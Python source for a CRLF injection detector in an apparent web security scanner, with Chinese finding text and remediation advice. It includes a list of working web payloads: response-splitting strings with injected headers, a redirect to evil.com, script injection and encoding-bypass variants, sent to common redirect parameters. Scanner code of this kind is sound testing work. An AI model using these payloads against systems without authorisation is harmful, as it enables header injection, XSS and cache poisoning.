"""CRLF 注入检测器"""
import urllib.parse
from typing import List
from secops_core.http_client import http_get
from secops_core.config import ATTACK_DELAY
from secops_offense.attack_engine.finding import Finding
from secops_offense.attack_engine.auth import log_audit
from secops_offense.attack_engine.modules.base import BaseDetector
import time


class CRLFDetector(BaseDetector):
    name = "crlf"
    category = "CRLF"

    MARKER = "secopscrlf"

    PAYLOADS = [
        f"%0d%0aInjected-Header:{MARKER}",
        f"%0D%0AInjected-Header:{MARKER}",
        f"\r\nInjected-Header:{MARKER}",
        f"%0d%0a%0d%0a<script>alert(1)</script>",
        f"%0d%0aLocation:https://evil.com",
        f"%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
        f"%5cr%5cnInjected:{MARKER}",
        f"\\r\\nInjected-Header:{MARKER}",
        f"%E5%98%8A%E5%98%8DInjected:{MARKER}",
        f"%c0%8a%c0%8aInjected:{MARKER}",
    ]

    def test(self, target_url: str, params: list = None, **kwargs) -> List[Finding]:
        findings = []

        if params is None:
            parsed = urllib.parse.urlparse(target_url)
            if parsed.query:
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            else:
                params = ["redirect", "url", "next", "return", "goto",
                          "redir", "continue", "callback", "next_url",
                          "return_to", "dest", "target"]

        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for param in params:
            for payload in self.PAYLOADS:
                test_url = f"{base_url}?{urllib.parse.urlencode({param: payload})}"
                log_audit("CRLF_TEST", test_url, f"param={param}, payload={payload[:50]}")

                status, headers, body = http_get(test_url)

                if status == 0:
                    time.sleep(ATTACK_DELAY)
                    continue

                for header_name, header_value in headers.items():
                    if self.MARKER.lower() in header_value.lower():
                        findings.append(Finding(
                            vuln_type="CRLF", severity="high",
                            title=f"CRLF 注入 - HTTP 响应头注入",
                            location=test_url, payload=payload,
                            evidence=f"注入的 header 出现在响应头中: {header_name}: {header_value[:100]}",
                            description=f"参数 {param} 的输入被注入到 HTTP 响应头中，可导致 XSS 或缓存投毒。",
                            remediation="对用户输入中的 \\r\\n 字符进行过滤或编码"
                        ))
                        break

                if self.MARKER.lower() in body.lower():
                    findings.append(Finding(
                        vuln_type="CRLF", severity="high",
                        title=f"CRLF 注入 - HTTP 响应体注入",
                        location=test_url, payload=payload,
                        evidence=f"注入内容出现在响应体中",
                        description=f"参数 {param} 的输入导致 CRLF 注入。",
                        remediation="过滤或编码所有 CRLF 字符"
                    ))
                    break

                time.sleep(ATTACK_DELAY)

        return findings
